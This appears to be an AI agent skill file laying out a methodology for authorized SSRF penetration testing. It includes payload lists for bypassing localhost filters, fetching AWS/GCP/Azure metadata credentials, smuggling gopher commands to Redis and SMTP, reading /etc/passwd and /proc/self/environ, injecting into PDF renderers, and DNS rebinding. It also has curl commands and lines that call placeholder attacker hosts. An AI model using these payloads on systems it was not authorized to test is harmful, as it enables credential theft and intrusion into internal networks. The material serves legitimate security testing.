---
name: ssrf-scanner
description: "Invoke this skill when the task requires testing for server-side request forgery (SSRF) vulnerabilities under authorized engagement: basic SSRF, blind SSRF with out-of-band detection, cloud metadata service access (AWS IMDSv1/v2, GCP, Azure), PDF/image render SSRF, protocol smuggling, and DNS rebinding. A finding is confirmed only when internal resource access or an out-of-band callback is demonstrated."
---

# Server-Side Request Forgery (SSRF) Testing

This skill covers SSRF testing from discovery through exploitation and impact assessment. SSRF findings require proof of internal network interaction or cloud metadata access; a modified request alone is not a finding unless a response or out-of-band callback confirms server-side fetch behavior.

## Boundaries

| Allowed | Prohibited |
|---|---|
| Fetching cloud metadata endpoints from the target server | Lateral movement into internal services beyond proof-of-access |
| Demonstrating internal port/service reachability | Port scanning the entire internal network (test a targeted sample) |
| Reading metadata credentials to prove impact | Using stolen metadata credentials to access cloud resources |
| OOB callbacks to tester-controlled infrastructure | Exfiltrating sensitive data beyond what constitutes proof |
| Protocol smuggling proof-of-concept (gopher, dict, file) | Destructive operations via smuggled protocols |
| DNS rebinding against test infrastructure | DNS rebinding against third-party infrastructure |
| PDF/image render SSRF with benign callback payloads | Weaponized payloads that attack internal services through render engines |

## Phase 0: Pre-engagement setup

1. Confirm target application and SSRF-candidate endpoints are within authorized scope.
2. Set up an out-of-band (OOB) callback server:
   - Burp Collaborator, interactsh (`interactsh-client`), or a simple listener (`python3 -m http.server 8888` on a public VPS).
   - Record the callback domain/IP for payload insertion.
3. Identify the target's hosting environment: AWS, GCP, Azure, on-premise, or hybrid. This determines which metadata endpoints to test.
4. Prepare working directory: `mkdir -p work/ssrf-scanner/{requests,responses,callbacks,proofs}`.

## Phase 1: SSRF entry point enumeration

### 1.1 URL-accepting parameters

Search for any parameter, header, or field where the server fetches a user-supplied URL:

- [ ] Explicit URL parameters: `url=`, `uri=`, `path=`, `dest=`, `redirect=`, `next=`, `target=`, `rurl=`, `return=`, `link=`, `feed=`, `host=`, `site=`.
- [ ] Webhook configuration endpoints.
- [ ] Import/export features (import from URL, fetch RSS/Atom feed).
- [ ] Avatar/image URL fields (profile picture from URL).
- [ ] PDF/document generation from URL (`/api/pdf?url=`).
- [ ] File inclusion or template URL parameters.
- [ ] OAuth callback URLs and OpenID configuration URLs.
- [ ] Proxy or caching endpoints.
- [ ] API integrations that fetch external resources.

### 1.2 Hidden SSRF vectors

Less obvious entry points:

- [ ] `Referer` header processed by analytics or logging.
- [ ] `X-Forwarded-For` / `X-Original-URL` headers parsed server-side.
- [ ] SVG/XML file upload with external entity references (`<!ENTITY xxe SYSTEM "http://...">`).
- [ ] HTML-to-PDF converters processing `<img src="http://...">`, `<link>`, `<iframe>`, `@import url()`.
- [ ] Email features: "send to email" with attacker-controlled SMTP or link previews.
- [ ] Video/audio embed features that fetch thumbnails or metadata.
- [ ] GraphQL queries with URL-type arguments.

### 1.3 Baseline behavior

For each candidate, establish what a normal (external) URL fetch looks like:

```bash
# Test with a public URL the server can reach
curl -s 'https://target/api/fetch?url=https://httpbin.org/get' -o baseline.json

# Test with your callback server
curl -s 'https://target/api/fetch?url=http://CALLBACK_SERVER/ssrf-test'
```

Confirm the server fetches the URL. If no response body is returned (blind), check the callback server for the incoming request.

## Phase 2: Basic SSRF testing

### 2.1 Localhost and internal network probes

```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:8080/
http://127.0.0.1:3000/
http://127.0.0.1:6379/     (Redis)
http://127.0.0.1:9200/     (Elasticsearch)
http://127.0.0.1:27017/    (MongoDB)
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
```

### 2.2 Localhost bypass techniques

If `127.0.0.1` and `localhost` are blocked:

```
# Decimal encoding
http://2130706433/            (127.0.0.1 as decimal)
http://0x7f000001/            (hex)
http://017700000001/          (octal)

# IPv6
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::1]/

# DNS that resolves to 127.0.0.1
http://localtest.me/
http://spoofed.burpcollaborator.net/  (configure to resolve to 127.0.0.1)
http://127.0.0.1.nip.io/
http://customer-resolve.burpcollaborator.net/

# URL parsing tricks
http://127.0.0.1@evil.com/     (some parsers use the hostname after @)
http://evil.com#@127.0.0.1/
http://evil.com\@127.0.0.1/
http://127.1/                   (short form)
http://0/                       (resolves to 0.0.0.0 on many systems)

# Redirect-based bypass
http://ATTACKER_SERVER/redirect?to=http://127.0.0.1/
```

### 2.3 Protocol variations

```
# Different schemes
https://127.0.0.1/
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a
dict://127.0.0.1:6379/INFO
file:///etc/passwd
ftp://127.0.0.1/
```

## Phase 3: Cloud metadata service exploitation

### 3.1 AWS IMDSv1

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

If `/iam/security-credentials/` returns a role name, fetch the full credentials path. The returned `AccessKeyId`, `SecretAccessKey`, and `Token` prove critical impact. **Do not use the credentials to access AWS resources.** Their existence is the finding.

### 3.2 AWS IMDSv2 (token-required)

IMDSv2 requires a PUT request to get a session token first:

```
# Step 1: Get token (requires PUT with TTL header)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token to access metadata
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN_FROM_STEP_1
```

If the SSRF vector allows setting HTTP method and custom headers, IMDSv2 is exploitable. If not, test whether the target falls back to IMDSv1 (misconfiguration) or whether the SSRF library follows redirects that can smuggle the PUT.

### 3.3 GCP metadata

```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# GCP requires the Metadata-Flavor header:
# Metadata-Flavor: Google
# Test whether the SSRF vector allows custom headers

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

GCP blocks requests without `Metadata-Flavor: Google`. If the SSRF does not allow custom headers, GCP metadata is not directly reachable (note this as a mitigation).

### 3.4 Azure metadata (IMDS)

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Azure requires:
# Metadata: true
```

Azure IMDS also requires a custom header. Test as with GCP.

### 3.5 Kubernetes and container metadata

```
# Kubernetes service account token
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace

# Kubernetes API (if network-reachable)
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/pods

# Docker socket
http://127.0.0.1:2375/version
http://127.0.0.1:2376/version
```

## Phase 4: Blind SSRF detection

When the server fetches the URL but does not return the response body to the attacker.

### 4.1 OOB callback detection

```bash
# Use unique identifiers per test to correlate callbacks
curl -s 'https://target/api/fetch?url=http://UNIQUE_ID.CALLBACK_DOMAIN/ssrf-param-url'
curl -s 'https://target/api/fetch' -d 'url=http://UNIQUE_ID2.CALLBACK_DOMAIN/ssrf-post'
```

Check the callback server for incoming HTTP requests. The request's source IP, User-Agent, and timing confirm blind SSRF.

### 4.2 DNS-only detection

If HTTP callbacks are blocked but DNS resolution occurs:

```
http://UNIQUE_ID.CALLBACK_DOMAIN/     (the DNS query alone confirms SSRF)
```

Monitor DNS query logs on the callback infrastructure.

### 4.3 Timing-based detection

If neither HTTP nor DNS callbacks work:

```bash
# Compare response times
# Fast: external URL that responds quickly
time curl -s 'https://target/api/fetch?url=http://httpbin.org/delay/0'

# Slow: URL that delays
time curl -s 'https://target/api/fetch?url=http://httpbin.org/delay/5'

# Closed port (connection timeout = slow)
time curl -s 'https://target/api/fetch?url=http://10.0.0.1:81/'
```

A consistent delay differential indicates the server is making the request.

## Phase 5: PDF and image render SSRF

### 5.1 HTML-to-PDF engines (wkhtmltopdf, Chromium headless, Puppeteer)

```html
<!-- Inject into content that gets rendered to PDF -->
<img src="http://CALLBACK_SERVER/ssrf-pdf-img">
<link rel="stylesheet" href="http://CALLBACK_SERVER/ssrf-pdf-css">
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<script>document.write('<img src="http://CALLBACK_SERVER/ssrf-pdf-js">')</script>
<object data="http://169.254.169.254/latest/meta-data/"></object>

<!-- CSS import -->
<style>@import url('http://CALLBACK_SERVER/ssrf-pdf-import');</style>

<!-- SVG with external reference -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://CALLBACK_SERVER/ssrf-svg" />
</svg>
```

### 5.2 Image processing SSRF

If the application processes images (resize, thumbnail, convert):

```
# SVG with external reference
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://CALLBACK_SERVER/ssrf-svg-process" width="100" height="100"/>
</svg>

# ImageMagick-specific (if identified)
# MSL (ImageMagick Scripting Language)
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'http://CALLBACK_SERVER/ssrf-magick'
pop graphic-context
```

### 5.3 Render engine file read

Some render engines support `file://`:

```html
<iframe src="file:///etc/passwd"></iframe>
<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')">
<link rel="attachment" href="file:///etc/passwd">
```

If the PDF is returned to the attacker, the file contents may be visible in the rendered output.

## Phase 6: Protocol smuggling

### 6.1 Gopher protocol (most powerful)

Gopher allows sending arbitrary bytes to a TCP port, enabling interaction with services that speak line-based protocols.

**Redis (port 6379):**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0atest%0d%0a$4%0d%0assrf%0d%0a
```

**SMTP (port 25):**
```
gopher://127.0.0.1:25/_HELO%20attacker%0d%0aMAIL%20FROM:<test@test>%0d%0aRCPT%20TO:<admin@target>%0d%0aDATA%0d%0aSubject:%20SSRF%20Test%0d%0a%0d%0aSSRF%20proof%0d%0a.%0d%0aQUIT%0d%0a
```

### 6.2 Dict protocol

```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats    (Memcached)
```

### 6.3 File protocol

```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp            (shows open ports in hex)
```

## Phase 7: DNS rebinding

When the server validates the URL hostname at request time but a DNS rebinding attack can change the resolution between validation and fetch.

### 7.1 Setup

1. Configure a DNS server that alternates responses:
   - First query: resolves to an allowed external IP.
   - Second query: resolves to `127.0.0.1` or an internal IP.
2. Use a rebinding service (e.g., rbndr.us, 1u.ms) or a custom DNS server.

### 7.2 Execution

```
# rebind domain alternates between EXTERNAL_IP and 127.0.0.1
http://7f000001.EXTERNAL_HEX.rbndr.us/
```

The server validates against the first resolution (external), then fetches using the second (internal).

### 7.3 Limitations

DNS rebinding requires the target to make two separate DNS lookups (validation + fetch) with enough time between them for the TTL to expire. Many modern HTTP libraries cache DNS, reducing effectiveness.

## Phase 8: Chaining and impact assessment

For each confirmed SSRF:

1. **Internal service mapping**: what internal hosts and ports are reachable? Test a targeted sample (5-10 common ports on `127.0.0.1` and the likely subnet), not a full scan.
2. **Cloud credential access**: were metadata credentials retrieved? Document the IAM role and permission scope (do not exercise the credentials).
3. **Data exposure**: what internal data was readable (config files, internal APIs, databases)?
4. **Protocol reach**: which protocols does the SSRF support (HTTP, HTTPS, gopher, file, dict, FTP)?
5. **Filter bypass**: document which bypass techniques were needed and what the original filter blocked.

## Verification requirements

A finding is **confirmed** only when ALL of the following are met:

1. **Server-side fetch proof**: evidence that the server made a request to the attacker-specified destination:
   - Response body containing internal resource data (metadata, internal page content, file contents).
   - OOB callback received on the tester's server with the target's server IP as source.
   - DNS query logged for the attacker's callback domain from the target's infrastructure.
   - Timing differential consistent with server-side network activity (weakest; must be reproduced 3+ times).
2. **Internal access proof**: the fetched resource is not externally reachable (internal IP, metadata endpoint, localhost service, or local file).
3. **Replayable artifact**: a curl command or request file that reproduces the SSRF.
4. **Filter bypass documented**: if bypass techniques were needed, the original filter behavior and the bypass method are recorded.

## Output format

```markdown
## SSRF Finding: [endpoint] - [parameter]

**Severity**: Critical / High / Medium
**SSRF Type**: Basic / Blind (OOB) / Blind (DNS) / PDF render / Protocol smuggling
**Internal Target Reached**: 169.254.169.254 / 127.0.0.1:6379 / file:///etc/passwd

### Injection point
- **URL**: https://target/api/preview?url=PAYLOAD
- **Parameter**: url (GET)
- **Payload**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

### Proof of internal access
- **Response content**: IAM role name `ec2-app-role` returned in response body
- **Credential proof**: AccessKeyId `AKIA...` (first 8 chars), expiration timestamp (redacted full creds)
- **OR (blind)**: HTTP callback received at `CALLBACK_SERVER` from IP `10.0.1.42` at 14:32:07 UTC

### Filter bypass (if applicable)
- Original filter blocked: `127.0.0.1`, `localhost`, `169.254.*`
- Bypass method: DNS rebinding via `rbndr.us` resolving to `169.254.169.254`

### Replayable request
\```bash
curl -s 'https://target/api/preview?url=http://169.254.169.254/latest/meta-data/' \
  -H 'Cookie: session=TOKEN'
\```

### Impact
- AWS IAM credentials for role `ec2-app-role` accessible (S3 read/write, DynamoDB full access).
- Internal Redis on port 6379 reachable (gopher protocol supported).
- `/etc/passwd` readable via `file://` protocol.

### Remediation
- Enforce allowlist of permitted URL schemes (https only) and destination hosts.
- Deploy IMDSv2 with hop limit of 1.
- Use a network-level metadata firewall (iptables rule blocking 169.254.169.254 from application processes).
- Validate resolved IP addresses against internal ranges before making the request.
```

## Completion self-check

- [ ] Every URL-accepting parameter has been tested with internal and metadata payloads.
- [ ] Cloud metadata endpoints tested for all applicable providers (AWS, GCP, Azure).
- [ ] Blind SSRF tested via OOB callbacks where direct response is not available.
- [ ] Protocol support mapped (HTTP, HTTPS, gopher, dict, file, FTP).
- [ ] Filter bypass techniques documented where filters were encountered.
- [ ] Every confirmed finding has server-side fetch proof, not just a modified request.
- [ ] No internal credentials were used beyond proving their existence.
- [ ] All requests and callback logs are saved as replayable artifacts.
